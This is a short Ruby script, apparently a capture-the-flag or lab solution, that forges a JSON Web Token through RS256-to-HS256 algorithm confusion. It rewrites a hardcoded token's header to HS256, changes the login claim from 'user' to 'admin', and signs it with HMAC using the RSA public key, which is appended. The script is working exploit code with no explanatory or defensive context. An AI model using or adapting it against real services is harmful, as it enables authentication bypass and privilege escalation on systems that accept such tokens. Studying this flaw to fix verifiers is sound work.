require 'base64'
require 'openssl'

pub = File.open("public.pem").read
TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InVzZXIifQ.RKVu9UEbdAaEi8EVph4c9lDZjLtkxDKts57kdaqZwd76GtRaT2tuxJBkid8wyofh-u23zgasO1ei1_beMBufseH5XE6P8nCk-IDsjiTOthF2DPOEoiNlf30HmWEcRdnxAjCTfRWAWoALBfNFutVbO0PP9vRmu9tNDrExd8x5erP-QnDfdEIQIi763FiLqwP5nVqKjlBZkNuEdiZxyCkgcLg-WZtQkGlf6G78n4U8T6qGnHXxRZxuuMcEEYnbf5iHPNKqys-t4hvc1h3vAWH_qxPSuzRKg_mucmY7jEYCnIK5MU_jCg12-LPYOk91e8_HjY4bvJmpm2lSQvHqQdJoYw"

header, payload, signature = TOKEN.split('.')

decoded_header = Base64.decode64(header)
decoded_header.gsub!("RS256","HS256")
puts decoded_header
new_header = Base64.strict_encode64(decoded_header).gsub("=","")

decoded_payload = Base64.decode64(payload)
decoded_payload.gsub!("user", "admin")
puts decoded_payload
new_payload = Base64.strict_encode64(decoded_payload).gsub("=","")

data = new_header+"."+new_payload

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), pub, data))
puts data+"."+signature





public.pem >

-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAo2R2WvnypG871pBqaAUY
ShKibV21THtfdQq6uEcVMGHm7kcvsAriHTvC3IlhmfIIMxd3zBGAyNgPpUQiqJQG
Ac7W3yUxMRO8gzWZzZMjzQT0mDAwQrNWPlKUvDS7mJOymk1kxnilqhuXi8NsbfbC
9STzZUAoqSyrsLGyggLB5yEPBuNZ3wK/3yNaDmTny3i5s96qfujmQ15MJ/QAgHCr
+Zeq54fG32yz0o4br88SUEdsExblVYosf3GYRt0cMF/zzeyAJ7QmRqxvN2fNwa/N
IMPLYzZJs7L1aY75ryzV4P39SRTyQn/op6iWUCuVhZRchKXTGQUfZ7b1HA95it1b
UQIDAQAB
-----END PUBLIC KEY-----


